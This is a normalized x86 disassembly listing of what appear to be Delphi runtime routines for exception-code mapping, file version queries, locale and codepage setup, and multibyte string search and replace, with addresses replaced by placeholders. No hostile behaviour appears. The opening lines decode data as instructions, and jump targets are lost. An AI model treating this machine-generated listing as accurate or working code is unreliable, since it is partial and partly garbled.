jle r-xdata
jo r-xdata
[ ebx - 0x3d ]
mov eax eax
loopne r-xdata
push edx
je r-xdata
pop ebp
cld
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_40bcf8
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
mov edx [ rw-data ]
jmp r-xdata
dec dl
je r-xdata
pop es
arpl [ gs : eax ] cx
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edx + 0x40040 ] dl
add [ eax ] al
push ebx
mov ebx edx
mov edx eax
dec dl
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405df8
lea eax [ ebp - 0x4 ]
mov edx ebx
call sub_4040d0
jmp r-xdata
push ebx
mov eax edx
jmp sub_403a74
mov edx [ rw-data ]
jmp r-xdata
dec edx
sub dl 0x16
jb r-xdata
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x18 ] 0xb
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x10 ] 0xb
mov [ ebp - 0xc ] edi
mov [ ebp - 0x8 ] 0x0
lea eax [ ebp - 0x1c ]
push eax
push 0x2
lea edx [ ebp - 0x20 ]
mov eax [ rw-data ]
call sub_405df8
mov ecx [ ebp - 0x20 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40ba0c
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40bcff
lea eax [ ebp - 0x20 ]
call sub_404038
lea eax [ ebp - 0x4 ]
call sub_404038
retn
and eax 0xff
lea eax [ eax * 8 + rw-data ]
mov ecx [ eax + 0x4 ]
mov eax [ eax ]
mov dl 0x1
call sub_40b9d0
mov edx eax
jmp r-xdata
jmp r-xdata
call sub_40bb88
mov edx eax
sub_40bc5c
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x4 ] ebx
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_40bcf8
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405df8
lea eax [ ebp - 0x4 ]
mov edx ebx
call sub_4040d0
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x18 ] 0xb
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x10 ] 0xb
mov [ ebp - 0xc ] edi
mov [ ebp - 0x8 ] 0x0
lea eax [ ebp - 0x1c ]
push eax
push 0x2
lea edx [ ebp - 0x20 ]
mov eax [ rw-data ]
call sub_405df8
mov ecx [ ebp - 0x20 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40ba0c
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40bcff
lea eax [ ebp - 0x20 ]
call sub_404038
lea eax [ ebp - 0x4 ]
call sub_404038
retn
sub_40bd4c
mov eax [ eax ]
cmp eax 0xc0000092
jg r-xdata
cmp eax 0xc0000096
jg r-xdata
je r-xdata
sub eax 0xc00000fd
je r-xdata
je r-xdata
mov al 0x6
retn
cmp eax 0xc000008e
jg r-xdata
mov al 0xe
retn
sub eax 0x3d
je r-xdata
mov al 0xc
retn
sub eax 0xc0000093
je r-xdata
add eax 0x3fffff71
sub eax 0x2
jb r-xdata
je r-xdata
mov al 0xd
retn
jmp r-xdata
mov al 0x9
retn
dec eax
je r-xdata
je r-xdata
mov al 0x7
retn
sub eax 0xc0000005
je r-xdata
mov al 0x16
retn
mov al 0x3
retn
dec eax
je r-xdata
mov al 0x8
retn
jmp r-xdata
mov al 0xb
retn
sub eax 0x87
je r-xdata
mov al 0x5
retn
jmp r-xdata
mov al 0x4
retn
dec eax
je r-xdata
jmp r-xdata
sub_40bde4
push ebp
mov ebp esp
add esp 0xfffffe90
push ebx
push esi
xor eax eax
mov [ ebp - 0x170 ] eax
mov [ ebp - 0x14c ] eax
mov [ ebp - 0x154 ] eax
mov [ ebp - 0x150 ] eax
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_40bf9f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov ebx [ eax - 0x4 ]
cmp [ ebx + 0x14 ] 0x0
jne r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405df8
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405df8
jmp r-xdata
mov eax [ ebx + 0xc ]
mov [ ebp - 0x16c ] eax
mov [ ebp - 0x168 ] 0x5
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x164 ] eax
mov [ ebp - 0x160 ] 0xb
mov [ ebp - 0x15c ] esi
mov [ ebp - 0x158 ] 0x5
lea eax [ ebp - 0x16c ]
push eax
push 0x2
lea edx [ ebp - 0x170 ]
mov eax [ rw-data ]
call sub_405df8
mov ecx [ ebp - 0x170 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40ba0c
mov ebx eax
push 0x105
lea eax [ ebp - 0x125 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call GetModuleFileNameA
test eax eax
je r-xdata
mov esi [ ebx + 0x18 ]
push 0x1c
lea eax [ ebp - 0x20 ]
push eax
mov eax [ ebx + 0xc ]
push eax
call VirtualQuery
cmp [ ebp - 0x10 ] 0x1000
jne r-xdata
mov eax [ ebx + 0xc ]
mov [ ebp - 0x148 ] eax
mov [ ebp - 0x144 ] 0x5
lea eax [ ebp - 0x150 ]
lea edx [ ebp - 0x125 ]
mov ecx 0x105
call sub_4042a8
mov eax [ ebp - 0x150 ]
lea edx [ ebp - 0x14c ]
call sub_408910
mov eax [ ebp - 0x14c ]
mov [ ebp - 0x140 ] eax
mov [ ebp - 0x13c ] 0xb
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x138 ] eax
mov [ ebp - 0x134 ] 0xb
mov [ ebp - 0x130 ] esi
mov [ ebp - 0x12c ] 0x5
lea eax [ ebp - 0x148 ]
push eax
push 0x3
lea edx [ ebp - 0x154 ]
mov eax [ rw-data ]
call sub_405df8
mov ecx [ ebp - 0x154 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40ba0c
mov ebx eax
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40bfa6
lea eax [ ebp - 0x170 ]
call sub_404038
lea eax [ ebp - 0x154 ]
mov edx 0x3
call sub_40405c
lea eax [ ebp - 0x4 ]
call sub_404038
retn
sub_40bfb0
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
xor edx edx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_40c06b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_40bd4c
and eax 0xff
mov edx eax
add edx 0xfffffffd
sub edx 0x8
jb r-xdata
lea eax [ eax * 8 + rw-data ]
mov ecx [ eax + 0x4 ]
mov eax [ eax ]
mov dl 0x1
call sub_40b9d0
mov ebx eax
jmp r-xdata
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_403434
test al al
je r-xdata
push ebp
call sub_40bde4
pop ecx
mov ebx eax
jmp r-xdata
dec edx
sub edx 0xa
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40c072
lea eax [ ebp - 0x10 ]
call sub_404038
retn
mov eax [ ebp - 0x4 ]
mov [ ebx + 0xc ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0x0
lea eax [ ebp - 0xc ]
push eax
push 0x0
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_405df8
mov ecx [ ebp - 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40ba0c
mov ebx eax
sub_40c08c
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40ba8c
mov [ rw-data ] eax
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40ba8c
mov [ rw-data ] eax
mov eax [ rw-data ]
mov [ eax ] r-xdata
mov eax [ rw-data ]
mov [ eax ] sub_40c07c
mov eax [ rw-data ]
mov edx [ r-xdata ]
mov [ eax ] edx
mov eax [ rw-data ]
mov [ eax ] sub_40bdcc
mov eax [ rw-data ]
mov [ eax ] sub_40bfb0
mov eax sub_40bd18
mov edx [ rw-data ]
mov [ edx ] eax
mov eax sub_40bd34
mov edx [ rw-data ]
mov [ edx ] eax
retn
sub_40c110
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
mov [ eax + 0xc ] 0x1
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx - 0x8 ]
xor eax eax
mov [ rw-data ] eax
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
retn
mov eax [ rw-data ]
mov [ eax + 0xc ] 0x1
mov eax [ rw-data ]
call sub_4032a8
xor eax eax
mov [ rw-data ] eax
sub_40c190
add esp 0xffffff6c
mov [ esp ] 0x94
push esp
call GetVersionExA
test eax eax
je r-xdata
add esp 0x94
retn
mov eax [ esp + 0x10 ]
mov [ rw-data ] eax
mov eax [ esp + 0x4 ]
mov [ rw-data ] eax
mov eax [ esp + 0x8 ]
mov [ rw-data ] eax
cmp [ rw-data ] 0x1
jne r-xdata
mov eax [ esp + 0xc ]
mov [ rw-data ] eax
mov eax [ esp + 0xc ]
and eax 0xffff
mov [ rw-data ] eax
jmp r-xdata
mov eax rw-data
lea edx [ esp + 0x14 ]
mov ecx 0x80
call sub_4042a8
sub_40c220
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
xor edx edx
mov [ ebp - 0x8 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_40c2f6
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x4 ] 0xffffffff
lea eax [ ebp - 0x8 ]
mov edx ebx
call sub_4040d0
lea eax [ ebp - 0x8 ]
call j_sub_404504
lea eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x8 ]
call sub_4044f8
push eax
call GetFileVersionInfoSizeA
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40c2fd
lea eax [ ebp - 0x8 ]
call sub_404038
retn
mov eax ebx
call sub_4026cc
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_40c2d9
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x10 ]
push eax
push ebx
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x8 ]
call sub_4044f8
push eax
call GetFileVersionInfoA
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x10 ]
call sub_4026ec
retn
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x14 ]
push eax
push r-xdata
mov eax [ ebp - 0x10 ]
push eax
call VerQueryValueA
test eax eax
je r-xdata
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x4 ] eax
sub_40c314
push esi
push edi
mov edi edx
xor edx edx
test eax eax
je r-xdata
mov eax edx
pop edi
pop esi
retn
cmp [ eax + edi ] 0x0
je r-xdata
test edi edi
jne r-xdata
mov esi edi
dec esi
jmp r-xdata
mov al [ eax ]
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
test esi esi
jl r-xdata
mov dl 0x1
jmp r-xdata
mov ecx edi
sub ecx esi
and ecx 0x80000001
jns r-xdata
mov cl [ eax + esi ]
and ecx 0xff
bt [ rw-data ] ecx
jb r-xdata
test ecx ecx
jne r-xdata
dec ecx
or ecx 0xfffffffe
inc ecx
dec esi
mov al [ eax + edi ]
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
mov dl 0x2
jmp r-xdata
mov dl 0x1
sub_40c38c
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
cmp [ rw-data ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_4044f8
mov edx esi
dec edx
call sub_40c314
sub_40c3c8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_4042f8
cmp esi eax
jle r-xdata
mov edx esi
mov eax ebx
call sub_40c3f0
pop esi
pop ebx
retn
mov eax ebx
call sub_4042f8
mov esi eax
sub_40c3f0
push ebx
push esi
push edi
mov esi edx
mov ebx eax
xor edi edi
test esi esi
jle r-xdata
mov eax edi
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_4042f8
cmp esi eax
jg r-xdata
mov edi esi
cmp [ rw-data ] 0x0
je r-xdata
mov eax 0x1
xor edi edi
cmp esi eax
jl r-xdata
mov dl [ ebx + eax - 0x1 ]
and edx 0xff
bt [ rw-data ] edx
jae r-xdata
inc eax
mov edx eax
mov eax ebx
call sub_40c600
jmp r-xdata
inc edi
cmp esi eax
jge r-xdata
sub_40c448
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov edi eax
mov eax edi
call sub_4042f8
mov [ ebp - 0xc ] eax
mov esi 0x1
mov ebx 0x1
jmp r-xdata
cmp ebx [ ebp - 0xc ]
jge r-xdata
cmp esi [ ebp - 0x4 ]
jne r-xdata
cmp esi [ ebp - 0x4 ]
jl r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax ] esi
mov eax [ ebp + 0x8 ]
mov [ eax ] ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
cmp ebx [ ebp - 0xc ]
jge r-xdata
inc esi
mov al [ edi + ebx - 0x1 ]
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
mov al [ edi + ebx - 0x1 ]
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
inc ebx
mov edx ebx
mov eax edi
call sub_40c600
mov ebx eax
jmp r-xdata
mov edx ebx
mov eax edi
call sub_40c600
dec eax
mov ebx eax
sub_40c4d8
push ebx
push esi
add esp 0xfffffff8
mov ebx edx
mov esi eax
xor eax eax
mov [ esp ] eax
test ebx ebx
jle r-xdata
mov eax [ esp ]
pop ecx
pop edx
pop esi
pop ebx
retn
mov eax esi
call sub_4042f8
cmp ebx eax
jg r-xdata
cmp ebx 0x1
jle r-xdata
mov [ esp ] ebx
cmp [ rw-data ] 0x0
je r-xdata
push esp
lea ecx [ esp + 0x8 ]
mov edx ebx
dec edx
mov eax esi
call sub_40c448
dec ebx
cmp ebx [ esp + 0x4 ]
jg r-xdata
xor eax eax
mov [ esp ] eax
jmp r-xdata
mov eax esi
call sub_4042f8
cmp eax [ esp ]
jg r-xdata
inc [ esp ]
jmp r-xdata
sub_40c53c
push ebx
push esi
add esp 0xfffffff8
mov ebx edx
mov esi eax
xor eax eax
mov [ esp ] eax
test ebx ebx
jle r-xdata
mov eax [ esp ]
pop ecx
pop edx
pop esi
pop ebx
retn
mov eax esi
call sub_4042f8
cmp ebx eax
jle r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax esi
call sub_4042f8
mov ebx eax
mov [ esp ] ebx
push esp
lea ecx [ esp + 0x8 ]
mov edx ebx
mov eax esi
call sub_40c448
mov eax esi
call sub_4042f8
cmp eax [ esp ]
jge r-xdata
mov eax esi
call sub_4042f8
mov [ esp ] eax
jmp r-xdata
sub_40c5c4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax 0x1
cmp [ rw-data ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov dl [ ebx + esi - 0x1 ]
and edx 0xff
bt [ rw-data ] edx
jae r-xdata
mov eax ebx
call sub_4044f8
add eax esi
dec eax
call sub_40c59c
sub_40c600
push ebx
push esi
mov ebx edx
mov esi eax
lea eax [ ebx + 0x1 ]
cmp [ rw-data ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov dl [ esi + ebx - 0x1 ]
and edx 0xff
bt [ rw-data ] edx
jae r-xdata
mov eax esi
call sub_4044f8
add eax ebx
dec eax
call sub_40c59c
add eax ebx
sub_40c63c
push ebx
push esi
mov ebx edx
mov esi eax
test ebx ebx
jle r-xdata
xor eax eax
pop esi
pop ebx
retn
mov eax esi
call sub_4042f8
cmp ebx eax
jg r-xdata
cmp [ esi + ebx - 0x1 ] 0x5c
jne r-xdata
mov edx ebx
mov eax esi
call sub_40c38c
test al al
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
sub_40c670
push ebx
push esi
push edi
push ebp
mov edi ecx
mov esi edx
mov ebp eax
xor ebx ebx
test edi edi
jle r-xdata
mov eax ebx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_4042f8
cmp edi eax
jg r-xdata
mov edx edi
mov eax esi
call sub_40c38c
test al al
jne r-xdata
mov eax ebp
call sub_4044f8
mov dl [ esi + edi - 0x1 ]
call sub_408bc4
test eax eax
setne bl
sub_40c6b4
push ebx
push esi
push edi
push ebp
mov esi edx
mov ebx eax
xor edi edi
mov eax ebx
call sub_4044f8
push eax
mov eax esi
call sub_4044f8
mov ebp eax
mov eax ebp
pop edx
call sub_40c778
mov ebx eax
test ebx ebx
je r-xdata
mov eax edi
pop ebp
pop edi
pop esi
pop ebx
retn
mov edi ebx
sub edi ebp
inc edi
sub_40c6ec
push ebx
push esi
push edi
push ebp
mov edi edx
mov esi eax
cmp [ rw-data ] 0x0
je r-xdata
mov edx edi
mov eax esi
call sub_4080a0
mov eax esi
call sub_4042f8
mov ebp eax
mov eax edi
mov edx ebp
call sub_404684
mov ebx 0x1
cmp ebp ebx
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax edi
call j_sub_404504#2
mov dl [ esi + ebx - 0x1 ]
mov [ eax + ebx - 0x1 ] dl
mov al [ esi + ebx - 0x1 ]
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
mov eax [ edi ]
mov al [ eax + ebx - 0x1 ]
add al 0xbf
sub al 0x1a
jae r-xdata
inc ebx
mov eax edi
call j_sub_404504#2
mov dl [ esi + ebx - 0x1 ]
mov [ eax + ebx - 0x1 ] dl
jmp r-xdata
inc ebx
cmp ebp ebx
jge r-xdata
mov eax edi
call j_sub_404504#2
add [ eax + ebx - 0x1 ] 0x20
jmp r-xdata
sub_40c778
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov ebp edx
mov esi eax
xor ebx ebx
test esi esi
je r-xdata
mov eax ebx
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
cmp [ esi ] 0x0
je r-xdata
test ebp ebp
je r-xdata
cmp [ ebp ] 0x0
je r-xdata
mov eax esi
call sub_408a40
mov [ esp ] eax
mov eax ebp
call sub_408a40
mov edi eax
mov edx ebp
mov eax esi
call sub_408bd8
mov ebx eax
jmp r-xdata
test ebx ebx
je r-xdata
xor ebx ebx
mov eax ebx
sub eax esi
mov edx [ esp ]
sub edx eax
cmp edi edx
jbe r-xdata
mov edx ebx
sub edx esi
mov eax esi
call sub_40c3b0
mov [ esp + 0x4 ] al
cmp [ esp + 0x4 ] 0x2
je r-xdata
cmp [ esp + 0x4 ] 0x1
jne r-xdata
push edi
push ebp
push edi
push ebx
push 0x0
push 0x400
call CompareStringA
cmp eax 0x2
je r-xdata
inc ebx
mov edx ebp
mov eax ebx
call sub_408bd8
mov ebx eax
inc ebx
sub_40c818
push ebx
push esi
mov ebx edx
mov edx ebx
call sub_40c840
mov esi eax
test bl bl
je r-xdata
mov eax esi
pop esi
pop ebx
retn
test eax eax
je r-xdata
mov esi eax
inc eax
mov edx ebx
call sub_40c840
test eax eax
jne r-xdata
sub_40c840
push ebx
push esi
push edi
mov ebx edx
mov esi eax
mov edx ebx
mov eax esi
call sub_408bc4
mov edi eax
test edi edi
je r-xdata
mov eax edi
pop edi
pop esi
pop ebx
retn
mov edx edi
sub edx esi
mov eax esi
call sub_40c3b0
sub al 0x1
jb r-xdata
je r-xdata
inc edi
jmp r-xdata
inc edi
mov edx ebx
mov eax edi
call sub_408bc4
mov edi eax
test edi edi
jne r-xdata
sub_40c880
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
xor edx edx
mov [ ebp - 0xc ] edx
xor edx edx
push ebp
push sub_40c8e4
push [ fs : edx ]
mov [ fs : edx ] esp
push 0x7
lea edx [ ebp - 0x7 ]
push edx
push 0x1004
push eax
call GetLocaleInfoA
lea eax [ ebp - 0xc ]
lea edx [ ebp - 0x7 ]
mov ecx 0x7
call sub_4042a8
mov eax [ ebp - 0xc ]
push eax
call GetACP
mov edx eax
pop eax
call sub_4083f4
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40c8eb
lea eax [ ebp - 0xc ]
call sub_404038
retn
sub_40c8f4
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
add edi 0xffffffec
push edi
mov eax [ rw-data ]
call sub_40c880
push eax
call GetCPInfo
xor esi esi
jmp r-xdata
cmp esi 0xc
jge r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov al [ edi + esi + 0x6 ]
or al [ edi + esi + 0x7 ]
jne r-xdata
mov al [ edi + esi + 0x6 ]
mov bl [ edi + esi + 0x7 ]
sub bl al
jb r-xdata
add esi 0x2
inc ebx
mov [ ebp - 0x1 ] al
mov al [ ebp - 0x1 ]
and eax 0xff
bts [ rw-data ] eax
inc [ ebp - 0x1 ]
dec bl
jne r-xdata
sub_40c96c
push ebp
mov ebp esp
add esp 0xfffffe68
push ebx
push esi
push edi
mov [ rw-data ] 0x409
mov [ rw-data ] 0x9
mov [ rw-data ] 0x1
call GetThreadLocale
test eax eax
je r-xdata
test ax ax
je r-xdata
mov [ rw-data ] eax
mov esi r-xdata
mov edi rw-data
mov ecx 0x8
[ edi ] [ esi ]
cmp [ rw-data ] 0x2
jne r-xdata
mov edx eax
and dx 0x3ff
movzx edx dx
mov [ rw-data ] edx
movzx eax ax
shr eax 0xa
mov [ rw-data ] eax
push 0x4a
call GetSystemMetrics
test eax eax
setne al
mov [ rw-data ] al
push 0x2a
call GetSystemMetrics
test eax eax
setne bl
mov [ rw-data ] bl
test bl bl
je r-xdata
call sub_40c954
test al al
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push ebp
call sub_40c8f4
pop ecx
push ebp
call sub_40c8f4
pop ecx
mov eax rw-data
mov edx r-xdata
mov cl 0x20
call sub_402de0
setne bl
mov [ rw-data ] bl
test bl bl
je r-xdata
mov [ rw-data ] 0x0
mov [ rw-data ] 0x0
jmp r-xdata
mov eax 0x80
lea edx [ ebp - 0x94 ]
mov [ rw-data ] 0x0
jmp r-xdata
mov [ edx ] al
inc eax
inc edx
cmp eax 0x100
jne r-xdata
lea eax [ ebp - 0x94 ]
lea edx [ ebp - 0x196 ]
push edx
push 0x80
push eax
push 0x2
mov eax [ rw-data ]
push eax
call GetStringTypeExA
mov eax 0x80
lea edx [ ebp - 0x196 ]
add edx 0x2
dec eax
jne r-xdata
cmp [ edx ] 0x2
sete cl
mov [ rw-data ] cl
test cl cl
jne r-xdata
jmp r-xdata
sub_40cae0
push ebp
mov ebp esp
mov ecx 0x8
push 0x0
push 0x0
dec ecx
jne r-xdata
push ebx
xor eax eax
push ebp
push sub_40cdab
push [ fs : eax ]
mov [ fs : eax ] esp
call sub_40c96c
call sub_40b2c4
cmp [ rw-data ] 0x0
je r-xdata
call GetThreadLocale
mov ebx eax
lea eax [ ebp - 0x10 ]
push eax
xor ecx ecx
mov edx 0x14
mov eax ebx
call sub_40b214
mov edx [ ebp - 0x10 ]
mov eax rw-data
call sub_40408c
lea eax [ ebp - 0x14 ]
push eax
mov ecx r-xdata
mov edx 0x1b
mov eax ebx
call sub_40b214
mov eax [ ebp - 0x14 ]
xor edx edx
call sub_4083f4
mov [ rw-data ] al
lea eax [ ebp - 0x18 ]
push eax
mov ecx r-xdata
mov edx 0x1c
mov eax ebx
call sub_40b214
mov eax [ ebp - 0x18 ]
xor edx edx
call sub_4083f4
mov [ rw-data ] al
mov cl 0x2c
mov edx 0xf
mov eax ebx
call sub_40b260
mov [ rw-data ] al
mov cl 0x2e
mov edx 0xe
mov eax ebx
call sub_40b260
mov [ rw-data ] al
lea eax [ ebp - 0x1c ]
push eax
mov ecx r-xdata
mov edx 0x19
mov eax ebx
call sub_40b214
mov eax [ ebp - 0x1c ]
xor edx edx
call sub_4083f4
mov [ rw-data ] al
mov cl 0x2f
mov edx 0x1d
mov eax ebx
call sub_40b260
mov [ rw-data ] al
lea eax [ ebp - 0x24 ]
push eax
mov ecx r-xdata
mov edx 0x1f
mov eax ebx
call sub_40b214
mov eax [ ebp - 0x24 ]
lea edx [ ebp - 0x20 ]
call sub_40b54c
mov edx [ ebp - 0x20 ]
mov eax rw-data
call sub_40408c
lea eax [ ebp - 0x2c ]
push eax
mov ecx r-xdata
mov edx 0x20
mov eax ebx
call sub_40b214
mov eax [ ebp - 0x2c ]
lea edx [ ebp - 0x28 ]
call sub_40b54c
mov edx [ ebp - 0x28 ]
mov eax rw-data
call sub_40408c
mov cl 0x3a
mov edx 0x1e
mov eax ebx
call sub_40b260
mov [ rw-data ] al
lea eax [ ebp - 0x30 ]
push eax
mov ecx r-xdata
mov edx 0x28
mov eax ebx
call sub_40b214
mov edx [ ebp - 0x30 ]
mov eax rw-data
call sub_40408c
lea eax [ ebp - 0x34 ]
push eax
mov ecx r-xdata
mov edx 0x29
mov eax ebx
call sub_40b214
mov edx [ ebp - 0x34 ]
mov eax rw-data
call sub_40408c
lea eax [ ebp - 0x8 ]
call sub_404038
lea eax [ ebp - 0xc ]
call sub_404038
lea eax [ ebp - 0x38 ]
push eax
mov ecx r-xdata
mov edx 0x25
mov eax ebx
call sub_40b214
mov eax [ ebp - 0x38 ]
xor edx edx
call sub_4083f4
test eax eax
jne r-xdata
call sub_40b49c
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_4040d0
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_4040d0
jmp r-xdata
push [ ebp - 0x8 ]
push [ ebp - 0x4 ]
push r-xdata
push [ ebp - 0xc ]
mov eax rw-data
mov edx 0x4
call sub_4043b8
push [ ebp - 0x8 ]
push [ ebp - 0x4 ]
push r-xdata
push [ ebp - 0xc ]
mov eax rw-data
mov edx 0x4
call sub_4043b8
mov cl 0x2c
mov edx 0xc
mov eax ebx
call sub_40b260
mov [ rw-data ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40cdb2
lea eax [ ebp - 0x40 ]
mov edx 0x10
call sub_40405c
retn
lea eax [ ebp - 0x40 ]
push eax
mov ecx r-xdata
mov edx 0x1005
mov eax ebx
call sub_40b214
mov eax [ ebp - 0x40 ]
xor edx edx
call sub_4083f4
test eax eax
jne r-xdata
lea eax [ ebp - 0x3c ]
push eax
mov ecx r-xdata
mov edx 0x23
mov eax ebx
call sub_40b214
mov eax [ ebp - 0x3c ]
xor edx edx
call sub_4083f4
test eax eax
jne r-xdata
lea eax [ ebp - 0x8 ]
mov edx r-xdata
call sub_4040d0
lea eax [ ebp - 0xc ]
mov edx r-xdata
call sub_4040d0
jmp r-xdata
sub_40ce58
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov esi [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_40cf7b
push [ fs : eax ]
mov [ fs : eax ] esp
test [ ebp + 0xc ] 0x2
je r-xdata
lea eax [ ebp - 0x8 ]
mov edx ebx
call sub_4040d0
lea eax [ ebp - 0xc ]
mov edx edi
call sub_4040d0
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_40806c
lea edx [ ebp - 0xc ]
mov eax edi
call sub_40806c
jmp r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
lea eax [ ebp - 0x10 ]
mov edx ebx
call sub_4040d0
mov eax esi
call sub_404038
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
call sub_40c6b4
mov ebx eax
test ebx ebx
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40cf82
lea eax [ ebp - 0x14 ]
mov edx 0x4
call sub_40405c
retn
push [ esi ]
lea eax [ ebp - 0x14 ]
push eax
mov ecx ebx
dec ecx
mov edx 0x1
mov eax [ ebp - 0x10 ]
call sub_404558
push [ ebp - 0x14 ]
push [ ebp - 0x4 ]
mov eax esi
mov edx 0x3
call sub_4043b8
lea eax [ ebp - 0x10 ]
push eax
mov eax edi
call sub_4042f8
mov edx eax
add edx ebx
mov ecx 0x7fffffff
mov eax [ ebp - 0x10 ]
call sub_404558
test [ ebp + 0xc ] 0x1
jne r-xdata
mov eax esi
mov edx [ ebp - 0x10 ]
call sub_404300
jmp r-xdata
lea eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0xc ]
call sub_4042f8
mov edx eax
add edx ebx
mov ecx 0x7fffffff
mov eax [ ebp - 0x8 ]
call sub_404558
mov eax esi
mov edx [ ebp - 0x10 ]
call sub_404300
